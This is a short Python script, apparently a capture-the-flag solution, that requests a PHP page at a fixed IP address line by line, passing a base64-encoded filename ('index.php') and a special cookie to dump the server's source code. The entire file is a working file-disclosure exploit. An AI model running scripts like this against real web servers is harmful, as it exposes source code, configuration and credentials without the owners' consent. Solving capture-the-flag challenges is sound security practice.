import requests

for i in range(0,30):
    url = "http://123.206.87.240:8002/web11/index.php?line="+ str(i) +"&filename=aW5kZXgucGhw"
    headers = {
        "Cookie": "margin=margin"
    }
    res = requests.get(url=url,headers=headers)
    if res.text:
        print(res.text.strip())